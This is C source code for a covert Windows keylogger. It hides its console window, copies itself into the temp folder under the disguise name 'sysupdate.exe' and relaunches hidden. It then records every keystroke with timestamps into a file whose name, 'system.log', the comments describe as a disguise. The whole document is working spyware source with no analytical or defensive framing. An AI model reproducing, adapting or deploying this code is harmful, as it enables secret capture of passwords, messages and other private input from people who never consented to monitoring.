#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <shlobj.h>

DWORD WINAPI KeyLogger(LPVOID param);
void hideConsole();
void moveToTempDir();

int main() {
    hideConsole();
    moveToTempDir();

    // Run logger in a new thread
    CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);

    // Keep main thread alive
    while (1) {
        Sleep(1000);
    }
    return 0;
}

void hideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

void moveToTempDir() {
    char tempPath[MAX_PATH];
    char exePath[MAX_PATH];
    char targetPath[MAX_PATH];

    GetTempPathA(MAX_PATH, tempPath);
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Rename the copied executable for disguise
    sprintf(targetPath, "%s\\sysupdate.exe", tempPath);

    if (CopyFileA(exePath, targetPath, FALSE)) {
        ShellExecuteA(NULL, "open", targetPath, NULL, NULL, SW_HIDE);
        ExitProcess(0);
    }
}

int isPrintable(int key) {
    return (key >= 32 && key <= 126);
}

void logKey(int key, FILE *file) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(file, "[%02d:%02d:%02d] ", t->tm_hour, t->tm_min, t->tm_sec);

    SHORT shift = GetAsyncKeyState(VK_SHIFT);
    SHORT caps = GetKeyState(VK_CAPITAL);

    if (key >= 'A' && key <= 'Z') {
        if ((caps && !shift) || (!caps && shift))
            fprintf(file, "%c\n", key);
        else
            fprintf(file, "%c\n", key + 32);
    } else if (key >= '0' && key <= '9') {
        if (shift) {
            char shifted[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
            fprintf(file, "%c\n", shifted[key - '0']);
        } else {
            fprintf(file, "%c\n", key);
        }
    } else if (isPrintable(key)) {
        fprintf(file, "%c\n", key);
    } else {
        switch (key) {
            case VK_SPACE: fprintf(file, "[SPACE]\n"); break;
            case VK_RETURN: fprintf(file, "[ENTER]\n"); break;
            case VK_TAB: fprintf(file, "[TAB]\n"); break;
            case VK_BACK: fprintf(file, "[BACKSPACE]\n"); break;
            case VK_SHIFT: fprintf(file, "[SHIFT]\n"); break;
            case VK_CONTROL: fprintf(file, "[CTRL]\n"); break;
            case VK_MENU: fprintf(file, "[ALT]\n"); break;
            case VK_LEFT: fprintf(file, "[LEFT ARROW]\n"); break;
            case VK_RIGHT: fprintf(file, "[RIGHT ARROW]\n"); break;
            case VK_UP: fprintf(file, "[UP ARROW]\n"); break;
            case VK_DOWN: fprintf(file, "[DOWN ARROW]\n"); break;
            case VK_ESCAPE: fprintf(file, "[ESCAPE]\n"); break;
            default:
                if (key >= VK_F1 && key <= VK_F12)
                    fprintf(file, "[F%d]\n", key - VK_F1 + 1);
                else
                    fprintf(file, "[KEYCODE %d]\n", key);
        }
    }

    fflush(file);
}

DWORD WINAPI KeyLogger(LPVOID param) {
    FILE *file = fopen("system.log", "a");  // Disguised log filename
    if (!file) return 1;

    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                if (key == VK_ESCAPE) {
                    fclose(file);
                    ExitProcess(0);
                }
                logKey(key, file);
            }
        }
        Sleep(10);
    }

    return 0;
}
